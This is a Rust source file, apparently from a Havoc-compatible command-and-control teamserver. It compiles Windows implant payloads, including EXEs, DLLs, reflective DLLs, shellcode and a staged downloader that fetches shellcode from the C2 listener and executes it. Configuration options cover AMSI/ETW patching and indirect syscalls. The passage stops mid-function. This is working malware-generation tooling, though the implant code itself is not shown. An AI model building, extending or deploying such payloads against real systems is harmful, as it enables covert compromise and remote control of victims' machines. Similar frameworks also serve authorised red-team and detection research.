//! Havoc-compatible Demon payload compilation support.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;

use sha2::{Digest, Sha256};

use red_cell_common::config::{BinaryConfig, DemonConfig, Profile};
use red_cell_common::operator::{BuildPayloadRequestInfo, CompilerDiagnostic};
use red_cell_common::{
    HttpListenerConfig, HttpListenerProxyConfig, ListenerConfig, ListenerProtocol,
};
use serde_json::{Map, Value};
use tempfile::TempDir;
use thiserror::Error;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::mpsc;

/// Incremental console output emitted while building a Demon payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BuildProgress {
    /// Havoc-style message severity label.
    pub level: String,
    /// Human-readable build output.
    pub message: String,
}

/// Compiled Demon payload bytes and metadata.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadArtifact {
    /// Final payload bytes returned to the operator.
    pub bytes: Vec<u8>,
    /// Suggested output filename.
    pub file_name: String,
    /// Echoed output format string.
    pub format: String,
}

/// Errors returned by the Demon payload builder.
#[derive(Debug, Error)]
pub enum PayloadBuildError {
    /// A required compiler, source tree, or template file is unavailable.
    #[error("payload build tooling is unavailable: {message}")]
    ToolchainUnavailable { message: String },
    /// The request payload or selected listener is not supported.
    #[error("invalid payload build request: {message}")]
    InvalidRequest { message: String },
    /// JSON in the operator request could not be parsed.
    #[error("failed to parse payload build configuration: {0}")]
    InvalidConfigJson(#[from] serde_json::Error),
    /// An I/O operation failed while compiling or reading artifacts.
    #[error("payload build I/O failed: {0}")]
    Io(#[from] std::io::Error),
    /// A compiler process exited unsuccessfully.
    #[error("payload build command failed: {command}")]
    CommandFailed {
        command: String,
        /// Structured diagnostics parsed from the compiler's stderr output.
        diagnostics: Vec<CompilerDiagnostic>,
    },
}

/// Content-addressed on-disk cache for compiled Demon payload artifacts.
///
/// Cache entries live at `<cache_dir>/<sha256_hex>.<ext>` and are keyed by a
/// SHA-256 hash that covers the teamserver version, target architecture, output
/// format, packed binary config, and binary-patch configuration.
///
/// All cache errors are non-fatal: a miss or a write failure is logged and the
/// builder falls through to a full compilation.
#[derive(Clone, Debug)]
pub struct PayloadCache {
    cache_dir: PathBuf,
}

impl PayloadCache {
    fn new(cache_dir: PathBuf) -> Self {
        Self { cache_dir }
    }

    fn artifact_path(&self, key: &CacheKey) -> PathBuf {
        self.cache_dir.join(format!("{}{}", key.hex, key.ext))
    }

    /// Look up a cache entry. Returns `None` on miss or any I/O error.
    async fn get(&self, key: &CacheKey) -> Option<Vec<u8>> {
        let path = self.artifact_path(key);
        match tokio::fs::read(&path).await {
            Ok(bytes) => {
                tracing::debug!(path = %path.display(), "payload cache hit");
                Some(bytes)
            }
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => None,
            Err(err) => {
                tracing::warn!(
                    path = %path.display(),
                    error = %err,
                    "payload cache read failed; treating as cache miss"
                );
                None
            }
        }
    }

    /// Persist bytes in the cache. Errors are logged but not propagated.
    ///
    /// Uses atomic write (write to temporary file, then rename) so that
    /// concurrent readers never observe a partially-written or truncated file.
    async fn put(&self, key: &CacheKey, bytes: &[u8]) {
        if let Err(err) = tokio::fs::create_dir_all(&self.cache_dir).await {
            tracing::warn!(
                dir = %self.cache_dir.display(),
                error = %err,
                "could not create payload cache directory; skipping cache write"
            );
            return;
        }
        let path = self.artifact_path(key);
        let dir = self.cache_dir.clone();
        let num_bytes = bytes.len();
        let bytes = bytes.to_vec();
        let dest = path.clone();

        // Perform the blocking tempfile + write + persist on the blocking pool
        // so we get atomic rename semantics without blocking the async runtime.
        let result = tokio::task::spawn_blocking(move || -> std::io::Result<()> {
            use std::io::Write;
            let mut tmp = tempfile::NamedTempFile::new_in(&dir)?;
            tmp.write_all(&bytes)?;
            tmp.persist(&dest)?;
            Ok(())
        })
        .await;

        match result {
            Ok(Ok(())) => tracing::debug!(
                path = %path.display(),
                bytes = num_bytes,
                "payload artifact cached"
            ),
            Ok(Err(err)) => tracing::warn!(
                path = %path.display(),
                error = %err,
                "failed to write payload cache entry"
            ),
            Err(err) => tracing::warn!(
                path = %path.display(),
                error = %err,
                "payload cache write task panicked"
            ),
        }
    }

    /// Remove every file in the cache directory and return the count removed.
    ///
    /// Returns `Ok(0)` if the cache directory does not exist.
    /// Per-entry removal errors are logged but do not stop the flush.
    pub async fn flush(&self) -> std::io::Result<u64> {
        let mut dir = match tokio::fs::read_dir(&self.cache_dir).await {
            Ok(dir) => dir,
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(0),
            Err(err) => return Err(err),
        };
        let mut count = 0u64;
        while let Some(entry) = dir.next_entry().await? {
            match tokio::fs::remove_file(entry.path()).await {
                Ok(()) => count += 1,
                Err(err) => tracing::warn!(
                    path = %entry.path().display(),
                    error = %err,
                    "failed to remove payload cache entry during flush"
                ),
            }
        }
        Ok(count)
    }
}

/// Internal cache key used to address a compiled artifact.
struct CacheKey {
    /// Lower-case hex SHA-256 digest of all build inputs.
    hex: String,
    /// File extension for this artifact type (e.g. `.exe`).
    ext: &'static str,
}

/// Compute a content-addressed cache key for a payload build.
///
/// The hash covers every input that determines the compiled output:
/// - Teamserver version (from `CARGO_PKG_VERSION`)
/// - Agent variant name (e.g. `"demon"`, `"archon"`) — ensures that builds
///   for different agent types never collide even when all other inputs match
/// - Target architecture
/// - Output format
/// - Packed binary config bytes embedded in the PE
/// - Binary-patch configuration applied after compilation
fn compute_cache_key(
    agent_name: &str,
    arch: Architecture,
    format: OutputFormat,
    config_bytes: &[u8],
    binary_patch: Option<&BinaryConfig>,
) -> Result<CacheKey, serde_json::Error> {
    let mut hasher = Sha256::new();
    hasher.update(env!("CARGO_PKG_VERSION").as_bytes());
    hasher.update(b"\x00");
    hasher.update(agent_name.as_bytes());
    hasher.update(b"\x00");
    hasher.update(arch.suffix().as_bytes());
    hasher.update(b"\x00");
    hasher.update(format.cache_tag().as_bytes());
    hasher.update(b"\x00");
    hasher.update(config_bytes);
    hasher.update(b"\x00");
    if let Some(patch) = binary_patch {
        // serde_json serialization is deterministic for the same data.
        let patch_json = serde_json::to_string(patch)?;
        hasher.update(patch_json.as_bytes());
    }
    let hex = format!("{:x}", hasher.finalize());
    Ok(CacheKey { hex, ext: format.file_extension() })
}

/// Teamserver service responsible for compiling Havoc-compatible Demon payloads.
#[derive(Clone, Debug)]
pub struct PayloadBuilderService {
    inner: Arc<PayloadBuilderInner>,
}

/// Per-request agent identity passed through the private build pipeline.
struct AgentBuildContext<'a> {
    /// Lowercase agent name used in output file names (e.g. `"demon"`, `"archon"`).
    name: &'a str,
    /// Root of the agent C/ASM source tree to compile.
    source_root: &'a Path,
}

#[derive(Clone, Debug)]
struct PayloadBuilderInner {
    toolchain: Toolchain,
    source_root: PathBuf,
    /// Source root for the Archon agent fork — points at `agent/archon/`.
    archon_source_root: PathBuf,
    shellcode_x64_template: PathBuf,
    shellcode_x86_template: PathBuf,
    /// Pre-compiled DllLdr position-independent loader (x64 only).
    /// Prepended to the Demon DLL to produce the Raw Shellcode format.
    dllldr_x64_template: PathBuf,
    /// C source template compiled standalone for the Staged Shellcode format.
    stager_template: PathBuf,
    default_demon: DemonConfig,
    binary_patch: Option<BinaryConfig>,
    cache: PayloadCache,
}

/// Parsed semantic version reported by a toolchain binary.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ToolchainVersion {
    /// Major version component.
    pub major: u32,
    /// Minor version component.
    pub minor: u32,
    /// Patch version component.
    pub patch: u32,
    /// Raw version string as extracted from the tool's output.
    pub raw: String,
}

impl std::fmt::Display for ToolchainVersion {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.raw)
    }
}

/// Minimum version requirement (major.minor) for a toolchain binary.
struct VersionRequirement {
    major: u32,
    minor: u32,
}

impl VersionRequirement {
    fn is_satisfied_by(&self, version: &ToolchainVersion) -> bool {
        (version.major, version.minor) >= (self.major, self.minor)
    }
}

/// Minimum GCC version required for MinGW cross-compilation (10.0+).
const GCC_MIN_VERSION: VersionRequirement = VersionRequirement { major: 10, minor: 0 };

/// Minimum NASM version required for Win32/Win64 object output (2.14+).
const NASM_MIN_VERSION: VersionRequirement = VersionRequirement { major: 2, minor: 14 };

#[derive(Clone, Debug)]
struct Toolchain {
    compiler_x64: PathBuf,
    // Version fields are used by the tracing log at startup and in tests; the
    // dead_code lint does not track macro-argument usage.
    #[allow(dead_code)]
    compiler_x64_version: ToolchainVersion,
    compiler_x86: PathBuf,
    #[allow(dead_code)]
    compiler_x86_version: ToolchainVersion,
    nasm: PathBuf,
    #[allow(dead_code)]
    nasm_version: ToolchainVersion,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Architecture {
    X64,
    X86,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum OutputFormat {
    Exe,
    ServiceExe,
    Dll,
    ReflectiveDll,
    Shellcode,
    /// Small HTTP(S) downloader EXE that fetches and executes the Demon
    /// shellcode payload at run time rather than embedding it directly.
    StagedShellcode,
    /// Position-independent shellcode produced by prepending `DllLdr.x64.bin`
    /// to the Demon DLL (x64 only; the DllLdr binary has no x86 counterpart).
    RawShellcode,
}

impl Architecture {
    fn parse(value: &str) -> Result<Self, PayloadBuildError> {
        match value.trim().to_ascii_lowercase().as_str() {
            "x64" => Ok(Self::X64),
            "x86" => Ok(Self::X86),
            other => Err(PayloadBuildError::InvalidRequest {
                message: format!("unsupported architecture `{other}`"),
            }),
        }
    }

    const fn nasm_format(self) -> &'static str {
        match self {
            Self::X64 => "win64",
            Self::X86 => "win32",
        }
    }

    const fn suffix(self) -> &'static str {
        match self {
            Self::X64 => ".x64",
            Self::X86 => ".x86",
        }
    }
}

impl OutputFormat {
    fn parse(value: &str) -> Result<Self, PayloadBuildError> {
        match value.trim() {
            "Windows Exe" => Ok(Self::Exe),
            "Windows Service Exe" => Ok(Self::ServiceExe),
            "Windows Dll" => Ok(Self::Dll),
            "Windows Reflective Dll" => Ok(Self::ReflectiveDll),
            "Windows Shellcode" => Ok(Self::Shellcode),
            "Windows Shellcode Staged" => Ok(Self::StagedShellcode),
            "Windows Raw Shellcode" => Ok(Self::RawShellcode),
            other => Err(PayloadBuildError::InvalidRequest {
                message: format!("unsupported output format `{other}`"),
            }),
        }
    }

    const fn file_extension(self) -> &'static str {
        match self {
            Self::Exe | Self::ServiceExe | Self::StagedShellcode => ".exe",
            Self::Dll | Self::ReflectiveDll => ".dll",
            Self::Shellcode | Self::RawShellcode => ".bin",
        }
    }

    /// Unique per-variant tag used in cache key computation.
    ///
    /// Unlike [`file_extension`](Self::file_extension), this returns a distinct
    /// value for every variant so that formats sharing the same extension
    /// (e.g. `Exe` vs `ServiceExe`) never collide in the payload cache.
    const fn cache_tag(self) -> &'static str {
        match self {
            Self::Exe => "exe",
            Self::ServiceExe => "service-exe",
            Self::Dll => "dll",
            Self::ReflectiveDll => "reflective-dll",
            Self::Shellcode => "shellcode",
            Self::StagedShellcode => "staged-shellcode",
            Self::RawShellcode => "raw-shellcode",
        }
    }
}

impl PayloadBuilderService {
    /// Resolve the MinGW/NASM toolchain and Havoc payload source tree from `profile`.
    pub fn from_profile(profile: &Profile) -> Result<Self, PayloadBuildError> {
        let repo_root = workspace_root()?;
        Self::from_profile_with_repo_root(profile, &repo_root)
    }

    fn from_profile_with_repo_root(
        profile: &Profile,
        repo_root: &Path,
    ) -> Result<Self, PayloadBuildError> {
        let build = profile.teamserver.build.as_ref();

        let compiler_x64 = resolve_executable(
            build.and_then(|config| config.compiler64.as_deref()),
            "x86_64-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x64_version =
            verify_tool_version(&compiler_x64, parse_gcc_version, &GCC_MIN_VERSION)?;

        let compiler_x86 = resolve_executable(
            build.and_then(|config| config.compiler86.as_deref()),
            "i686-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x86_version =
            verify_tool_version(&compiler_x86, parse_gcc_version, &GCC_MIN_VERSION)?;

        let nasm = resolve_executable(
            build.and_then(|config| config.nasm.as_deref()),
            "nasm",
            Some(repo_root),
        )?;
        let nasm_version = verify_tool_version(&nasm, parse_nasm_version, &NASM_MIN_VERSION)?;

        tracing::info!(
            compiler_x64 = %compiler_x64.display(),
            compiler_x64_version = %compiler_x64_version,
            compiler_x86 = %compiler_x86.display(),
            compiler_x86_version = %compiler_x86_version,
            nasm = %nasm.display(),
            nasm_version = %nasm_version,
            "payload build toolchain discovered and verified"
        );

        let toolchain = Toolchain {
            compiler_x64,
            compiler_x64_version,
            compiler_x86,
            compiler_x86_version,
            nasm,
            nasm_version,
        };

        let source_root = repo_root.join("src/Havoc/payloads/Demon");
        let archon_source_root = repo_root.join("agent/archon");
        let shellcode_x64_template = repo_root.join("src/Havoc/payloads/Shellcode.x64.bin");
        let shellcode_x86_template = repo_root.join("src/Havoc/payloads/Shellcode.x86.bin");
        let dllldr_x64_template = repo_root.join("src/Havoc/payloads/DllLdr.x64.bin");
        let stager_template = repo_root.join("payloads/templates/MainStager.c");

        for required_path in [
            &source_root,
            &shellcode_x64_template,
            &shellcode_x86_template,
            &dllldr_x64_template,
            &stager_template,
        ] {
            if !required_path.exists() {
                return Err(PayloadBuildError::ToolchainUnavailable {
                    message: format!("required payload asset missing: {}", required_path.display()),
                });
            }
        }

        // Archon source root is optional at startup — it may not be present on
        // all developer machines.  Missing Archon source is only an error when
        // an operator actually requests an Archon payload.

        let cache = PayloadCache::new(repo_root.join("target/payload-cache"));

        Ok(Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon: profile.demon.clone(),
                binary_patch: profile.demon.binary.clone(),
                cache,
            }),
        })
    }

    /// Compile a Demon payload for `listener` using the operator `request`.
    ///
    /// If a cached artifact exists for the same inputs, the compilation is
    /// skipped and the cached bytes are returned immediately.
    pub async fn build_payload<F>(
        &self,
        listener: &ListenerConfig,
        request: &BuildPayloadRequestInfo,
        mut progress: F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        // Resolve the agent name and source root for this build request.
        let agent_type = request.agent_type.trim();
        let (agent_name, source_root) = match agent_type {
            "Demon" => ("demon", &self.inner.source_root),
            "Archon" => {
                if !self.inner.archon_source_root.exists() {
                    return Err(PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "Archon source tree not found at {}",
                            self.inner.archon_source_root.display()
                        ),
                    });
                }
                ("archon", &self.inner.archon_source_root)
            }
            other => {
                return Err(PayloadBuildError::InvalidRequest {
                    message: format!("unsupported agent type `{other}`"),
                });
            }
        };

        let architecture = Architecture::parse(&request.arch)?;
        let format = OutputFormat::parse(&request.format)?;

        // The staged shellcode stager does not embed a Demon config — it only
        // needs the C2 connection parameters from the listener.  Route it to a
        // separate fast path that bypasses pack_config entirely.
        if format == OutputFormat::StagedShellcode {
            return self
                .build_staged_payload(listener, architecture, &request.format, &mut progress)
                .await;
        }

        let config = merged_request_config(&request.config, &self.inner.default_demon)?;

        // Compute the packed config bytes that will be embedded in the compiled
        // binary. Using these as part of the cache key ensures that any change
        // to the listener or demon configuration produces a distinct cache entry.
        let config_bytes = pack_config(listener, &config)?;
        let cache_key = compute_cache_key(
            agent_name,
            architecture,
            format,
            &config_bytes,
            self.inner.binary_patch.as_ref(),
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name =
                format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());
            return Ok(PayloadArtifact {
                bytes: cached,
                file_name,
                format: request.format.clone(),
            });
        }

        progress(BuildProgress { level: "Info".to_owned(), message: "starting build".to_owned() });

        let temp_dir = TempDir::new()?;
        let agent_ctx = AgentBuildContext { name: agent_name, source_root };
        let compiled = self
            .build_impl(
                listener,
                architecture,
                format,
                &config,
                &agent_ctx,
                temp_dir.path(),
                &mut progress,
            )
            .await?;
        let file_name = format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: request.format.clone() })
    }

    /// Return a reference to the payload artifact cache.
    pub fn cache(&self) -> &PayloadCache {
        &self.inner.cache
    }

    #[doc(hidden)]
    pub fn disabled_for_tests() -> Self {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain: Toolchain {
                    compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                    compiler_x64_version: unknown_version.clone(),
                    compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                    compiler_x86_version: unknown_version.clone(),
                    nasm: PathBuf::from("/nonexistent/nasm"),
                    nasm_version: unknown_version,
                },
                source_root: root.join("src/Havoc/payloads/Demon"),
                archon_source_root: PathBuf::from("/nonexistent/agent/archon"),
                shellcode_x64_template: root.join("src/Havoc/payloads/Shellcode.x64.bin"),
                shellcode_x86_template: root.join("src/Havoc/payloads/Shellcode.x86.bin"),
                dllldr_x64_template: root.join("src/Havoc/payloads/DllLdr.x64.bin"),
                stager_template: root.join("payloads/templates/MainStager.c"),
                default_demon: DemonConfig {
                    sleep: None,
                    jitter: None,
                    indirect_syscall: false,
                    stack_duplication: false,
                    sleep_technique: None,
                    proxy_loading: None,
                    amsi_etw_patching: None,
                    injection: None,
                    dotnet_name_pipe: None,
                    binary: None,
                    init_secret: None,
                    trust_x_forwarded_for: false,
                    trusted_proxy_peers: Vec::new(),
                    allow_legacy_ctr: false,
                },
                binary_patch: None,
                cache: PayloadCache::new(PathBuf::from("/nonexistent/payload-cache")),
            }),
        }
    }

    #[cfg(test)]
    fn with_paths_for_tests(
        toolchain: Toolchain,
        source_root: PathBuf,
        archon_source_root: PathBuf,
        shellcode_x64_template: PathBuf,
        shellcode_x86_template: PathBuf,
        dllldr_x64_template: PathBuf,
        stager_template: PathBuf,
        default_demon: DemonConfig,
        binary_patch: Option<BinaryConfig>,
        cache_dir: PathBuf,
    ) -> Self {
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon,
                binary_patch,
                cache: PayloadCache::new(cache_dir),
            }),
        }
    }

    async fn build_impl<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if format == OutputFormat::Shellcode {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(match architecture {
                Architecture::X64 => &self.inner.shellcode_x64_template,
                Architecture::X86 => &self.inner.shellcode_x86_template,
            })
            .await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        if format == OutputFormat::RawShellcode {
            if architecture == Architecture::X86 {
                return Err(PayloadBuildError::InvalidRequest {
                    message:
                        "Windows Raw Shellcode requires x64 architecture: no x86 DllLdr binary \
                         is available"
                            .to_owned(),
                });
            }
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll for raw shellcode".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(&self.inner.dllldr_x64_template).await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("raw shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        let bytes = self
            .compile_portable_executable(
                listener,
                architecture,
                format,
                config,
                agent,
                compile_dir,
                false,
                progress,
            )
            .await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });
        Ok(bytes)
    }

    #[allow(clippy::too_many_arguments)]
    async fn compile_portable_executable<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        shellcode_define: bool,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let config_bytes = pack_config(listener, config)?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: format!("config size [{} bytes]", config_bytes.len()),
        });

        let output_path = compile_dir.join(format!(
            "{}{}{}",
            agent.name,
            architecture.suffix(),
            format.file_extension()
        ));
        let defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
        let object_files = self
            .compile_asm_objects(architecture, agent.source_root, compile_dir, progress)
            .await?;
        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let mut args: Vec<OsString> = Vec::new();
        args.extend(object_files.into_iter().map(|path| path.into_os_string()));
        for path in c_sources(agent.source_root)? {
            args.push(
                path.strip_prefix(agent.source_root)
                    .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "failed to relativize source path {}: {source}",
                            path.display()
                        ),
                    })?
                    .as_os_str()
                    .to_os_string(),
            );
        }
        args.push(OsString::from("src/Demon.c"));
        args.push(OsString::from("-Iinclude"));
        args.extend(default_compiler_flags(format).into_iter().map(OsString::from));
        args.extend(defines.into_iter().map(|define| OsString::from(format!("-D{define}"))));
        args.extend(main_args(architecture, format).into_iter().map(OsString::from));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling source".to_owned(),
        });
        run_command(compiler, &args, agent.source_root, progress).await?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "finished compiling source".to_owned(),
        });

        let mut payload = tokio::fs::read(&output_path).await?;
        if let Some(binary_patch) = &self.inner.binary_patch {
            payload = patch_payload(payload, architecture, binary_patch)?;
        }
        Ok(payload)
    }

    async fn compile_asm_objects<F>(
        &self,
        architecture: Architecture,
        source_root: &Path,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<PathBuf>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let mut objects = Vec::new();

        for source in asm_sources(source_root, architecture)? {
            let file_stem =
                source.file_stem().and_then(|value| value.to_str()).ok_or_else(|| {
                    PayloadBuildError::ToolchainUnavailable {
                        message: format!("invalid assembly source file name {}", source.display()),
                    }
                })?;
            let object_path = compile_dir.join(format!("{file_stem}.o"));
            let relative = source.strip_prefix(source_root).map_err(|error| {
                PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "failed to relativize assembly source {}: {error}",
                        source.display()
                    ),
                }
            })?;

            run_command(
                &self.inner.toolchain.nasm,
                &[
                    OsString::from("-f"),
                    OsString::from(architecture.nasm_format()),
                    relative.as_os_str().to_os_string(),
                    OsString::from("-o"),
                    object_path.as_os_str().to_os_string(),
                ],
                source_root,
                progress,
            )
            .await?;
            objects.push(object_path);
        }

        Ok(objects)
    }

    /// Build path for the staged shellcode format.
    ///
    /// The stager does not embed a Demon config — it only needs the C2
    /// connection parameters.  The cache key is derived from the listener
    /// connection info so that re-builds with the same listener are cached.
    async fn build_staged_payload<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format_str: &str,
        progress: &mut F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let stager_key_bytes = stager_cache_bytes(listener)?;
        // Staged shellcode stagers are always built from the Demon source tree.
        let cache_key = compute_cache_key(
            "demon",
            architecture,
            OutputFormat::StagedShellcode,
            &stager_key_bytes,
            None,
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name = format!(
                "demon{}{}",
                architecture.suffix(),
                OutputFormat::StagedShellcode.file_extension()
            );
            return Ok(PayloadArtifact { bytes: cached, file_name, format: format_str.to_owned() });
        }

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "starting stager build".to_owned(),
        });

        let temp_dir = TempDir::new()?;
        let compiled =
            self.compile_stager(listener, architecture, temp_dir.path(), progress).await?;
        let file_name = format!(
            "demon{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        );

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact { bytes: compiled, file_name, format: format_str.to_owned() })
    }

    /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
    ///
    /// The stager is a standalone Windows EXE that downloads the Demon
    /// shellcode payload from the C2 listener at run time and executes it.
    /// It is compiled without the Demon source tree.
    async fn compile_stager<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let template_dst = compile_dir.join("MainStager.c");
        tokio::fs::copy(&self.inner.stager_template, &template_dst).await?;

        let defines = build_stager_defines(listener)?;

        let output_path = compile_dir.join(format!(
            "stager{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        ));

        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let entry = if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" };

        let mut args: Vec<OsString> = vec![
            OsString::from("MainStager.c"),
            OsString::from("-Os"),
            OsString::from("-s"),
            OsString::from("-mwindows"),
            OsString::from("-lwininet"),
            OsString::from("-Wl,--gc-sections"),
        ];
        args.extend(defines.into_iter().map(|d| OsString::from(format!("-D{d}"))));
        args.push(OsString::from("-e"));
        args.push(OsString::from(entry));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling stager".to_owned(),
        });
        run_command(compiler, &args, compile_dir, progress).await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });

        Ok(tokio::fs::read(&output_path).await?)
    }
}

fn workspace_root() -> Result<PathBuf, PayloadBuildError> {
    let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    let workspace_root =
        manifest_dir.parent().ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "failed to resolve repository root: manifest directory `{}` has no parent",
                manifest_dir.display()
            ),
        })?;
    workspace_root.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
        message: format!("failed to resolve repository root: {source}"),
    })
}

fn resolve_executable(
    configured: Option<&str>,
    fallback_name: &str,
    repo_root: Option<&Path>,
) -> Result<PathBuf, PayloadBuildError> {
    let candidate = configured
        .map(|path| {
            let path = PathBuf::from(path);
            if path.is_relative() {
                repo_root.map_or(path.clone(), |repo_root| repo_root.join(path))
            } else {
                path
            }
        })
        .or_else(|| find_in_path_or_common_locations(fallback_name))
        .ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "required executable `{fallback_name}` was not found in PATH or common \
                 toolchain locations (/usr/bin, /usr/local/bin, /opt/mingw)"
            ),
        })?;

    if candidate.is_file() {
        candidate.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
            message: format!("failed to resolve {}: {source}", candidate.display()),
        })
    } else {
        Err(PayloadBuildError::ToolchainUnavailable {
            message: format!("executable does not exist: {}", candidate.display()),
        })
    }
}

fn find_in_path(program: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(program)).find(|candidate| candidate.is_file())
}

/// Search PATH then well-known toolchain install locations for `program`.
///
/// Checked directories beyond PATH: `/usr/bin`, `/usr/local/bin`, `/opt/mingw/bin`,
/// `/opt/mingw64/bin`, `/usr/x86_64-w64-mingw32/bin`, `/usr/i686-w64-mingw32/bin`.
fn find_in_path_or_common_locations(program: &str) -> Option<PathBuf> {
    if let Some(found) = find_in_path(program) {
        return Some(found);
    }
    const EXTRA_DIRS: &[&str] = &[
        "/usr/bin",
        "/usr/local/bin",
        "/opt/mingw/bin",
        "/opt/mingw64/bin",
        "/usr/x86_64-w64-mingw32/bin",
        "/usr/i686-w64-mingw32/bin",
    ];
    EXTRA_DIRS.iter().map(|dir| std::path::Path::new(dir).join(program)).find(|p| p.is_file())
}

/// Parse `major.minor.patch` triples from a version token.
fn parse_version_triple(token: &str) -> Option<(u32, u32, u32)> {
